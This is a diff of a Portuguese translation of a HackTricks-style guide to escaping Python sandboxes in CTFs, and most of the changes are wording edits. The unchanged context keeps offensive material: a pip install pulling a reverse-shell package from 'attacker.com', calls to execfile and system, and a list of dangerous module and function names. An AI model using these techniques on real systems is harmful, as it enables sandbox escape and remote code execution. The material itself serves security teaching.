@@ -39,16 +39,15 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-Lembre-se de que as funções _**open**_ e _**read**_ podem ser úteis para **ler arquivos** dentro do sandbox python e para **escrever algum código** que você poderia **executar** para **burlar** o sandbox.
+Lembre-se de que as funções _**open**_ e _**read**_ podem ser úteis para **ler arquivos** dentro do sandbox python e para **escrever algum código** que você poderia **executar** para **contornar** o sandbox.
 
-> [!CAUTION]
-> A função **input()** do Python2 permite executar código python antes que o programa falhe.
+> [!CAUTION] > A função **input()** do **Python2** permite executar código python antes que o programa falhe.
 
 O Python tenta **carregar bibliotecas do diretório atual primeiro** (o seguinte comando imprimirá de onde o python está carregando os módulos): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../images/image (559).png>)
 
-## Bypass do sandbox pickle com os pacotes python instalados por padrão
+## Contornar o sandbox do pickle com os pacotes python instalados por padrão
 
 ### Pacotes padrão
 
@@ -80,7 +79,9 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
 Você pode baixar o pacote para criar o reverse shell aqui. Por favor, note que antes de usá-lo você deve **descompactá-lo, alterar o `setup.py` e colocar seu IP para o reverse shell**:
 
-{% file src="../../../images/Reverse.tar (1).gz" %}
+{{#file}}
+Reverse.tar (1).gz
+{{#endfile}}
 
 > [!NOTE]
 > Este pacote é chamado `Reverse`. No entanto, ele foi especialmente elaborado para que, quando você sair do reverse shell, o restante da instalação falhe, então você **não deixará nenhum pacote python extra instalado no servidor** quando sair.
@@ -177,7 +178,7 @@ class _:pass
 ```
 ### RCE criando objetos e sobrecarga
 
-Se você pode **declarar uma classe** e **criar um objeto** dessa classe, você poderia **escrever/sobrescrever diferentes métodos** que podem ser **ativados** **sem** **precisar chamá-los diretamente**.
+Se você pode **declarar uma classe** e **criar um objeto** dessa classe, você pode **escrever/sobrescrever diferentes métodos** que podem ser **ativados** **sem** **precisar chamá-los diretamente**.
 
 #### RCE com classes personalizadas
 
@@ -501,7 +502,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Além disso, se você acha que **outras bibliotecas** podem **invocar funções para executar comandos**, também podemos **filtrar por nomes de funções** dentro das possíveis bibliotecas:
+Além disso, se você acha que **outras bibliotecas** podem **invocar funções para executar comandos**, também podemos **filtrar por nomes de funções** dentro das bibliotecas possíveis:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -537,7 +538,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Pesquisa Recursiva de Builtins, Globals...
 
 > [!WARNING]
-> Isso é simplesmente **incrível**. Se você está **procurando por um objeto como globals, builtins, open ou qualquer outra coisa**, apenas use este script para **encontrar recursivamente lugares onde você pode encontrar esse objeto.**
+> Isso é simplesmente **incrível**. Se você está **procurando por um objeto como globals, builtins, open ou qualquer coisa** apenas use este script para **encontrar recursivamente lugares onde você pode encontrar esse objeto.**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -659,7 +660,7 @@ Você pode verificar a saída deste script nesta página:
 https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
 {{#endref}}
 
-## Python Format String
+## String de Formato Python
 
 Se você **enviar** uma **string** para o python que vai ser **formatada**, você pode usar `{}` para acessar **informações internas do python.** Você pode usar os exemplos anteriores para acessar globals ou builtins, por exemplo.
 ```python
@@ -701,7 +702,7 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Mais exemplos** sobre **exemplos de** **string** **de formato** podem ser encontrados em [**https://pyformat.info/**](https://pyformat.info)
+**Mais exemplos** sobre **formato** **string** podem ser encontrados em [**https://pyformat.info/**](https://pyformat.info)
 
 > [!CAUTION]
 > Verifique também a seguinte página para gadgets que irão r**evelar informações sensíveis de objetos internos do Python**:
@@ -772,7 +773,7 @@ O desafio na verdade explora outra vulnerabilidade no servidor que permite criar
 ## Dissecando Objetos Python
 
 > [!NOTE]
-> Se você quer **aprender** sobre **bytecode python** em profundidade, leia este **incrível** post sobre o tema: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> Se você quer **aprender** sobre **bytecode python** em profundidade, leia este **incrível** post sobre o tópico: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
 Em alguns CTFs, você pode receber o nome de uma **função personalizada onde a flag** reside e você precisa ver os **internos** da **função** para extraí-la.
 
@@ -796,7 +797,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` e `func_globals` (Mesma coisa) Obtém o ambiente global. No exemplo, você pode ver alguns módulos importados, algumas variáveis globais e seu conteúdo declarado:
+`__globals__` e `func_globals`(Mesma) Obtém o ambiente global. No exemplo, você pode ver alguns módulos importados, algumas variáveis globais e seu conteúdo declarado:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -921,7 +922,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Compilando Python
 
-Agora, vamos imaginar que de alguma forma você pode **extrair as informações sobre uma função que não pode executar** mas você **precisa** **executá-la**.\
+Agora, vamos imaginar que de alguma forma você pode **extrair as informações sobre uma função que você não pode executar**, mas você **precisa** **executá-la**.\
 Como no exemplo a seguir, você **pode acessar o objeto de código** dessa função, mas apenas lendo o desmonte você **não sabe como calcular a flag** (_imagine uma função `calc_flag` mais complexa_)
 ```python
 def get_flag(some_input):
@@ -1053,6 +1054,5 @@ será contornado
 - [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
-
 
 {{#include ../../../banners/hacktricks-training.md}}
